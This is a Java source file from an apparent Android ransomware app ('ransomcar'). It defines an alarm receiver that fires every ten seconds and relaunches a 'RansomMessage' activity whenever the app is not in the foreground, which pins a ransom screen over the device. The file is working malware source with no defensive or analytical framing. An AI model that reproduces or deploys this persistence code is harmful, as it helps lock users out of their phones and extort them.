package com.example.ransomcar;

import java.util.List;
import android.app.ActivityManager;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.PowerManager;
import android.util.Log;

public class AlarmRepeater extends BroadcastReceiver {
  @Override
  public void onReceive(Context context, Intent intent){   
      PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
      PowerManager.WakeLock wl = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "");
      wl.acquire();
      wl.release();
      
      if(!isMyActivityRunning(context)){
		Intent ransom = new Intent(context, RansomMessage.class);
		ransom.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		context.startActivity(ransom);}
  }

  public void SetAlarm(Context context){
      AlarmManager am=(AlarmManager)context.getSystemService(Context.ALARM_SERVICE);
      Intent i = new Intent(context, AlarmRepeater.class);
      PendingIntent pi = PendingIntent.getBroadcast(context, 0, i, 0); // (context, 0, i, 0)
      am.setRepeating(AlarmManager.RTC_WAKEUP, System.currentTimeMillis(), 1000 * 10 * 1, pi); // Milliseconds * Second * Minute
  }

  public void CancelAlarm(Context context){
      Intent intent = new Intent(context, AlarmRepeater.class);
      PendingIntent sender = PendingIntent.getBroadcast(context, 0, intent, 0);
      AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
      alarmManager.cancel(sender);
      Log.d( "AlarmRepeater ", "cancelling alarm");
  }
  
  public boolean isMyActivityRunning(Context context){
  	String myPackage="com.example.ransomcar";
  	ActivityManager manager = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
  	 List< ActivityManager.RunningTaskInfo > runningTaskInfo = manager.getRunningTasks(1); 
  	     ComponentName componentInfo = runningTaskInfo.get(0).topActivity;
  	   if(componentInfo.getPackageName().equals(myPackage)) return true;
  	return false;
  	}
  
}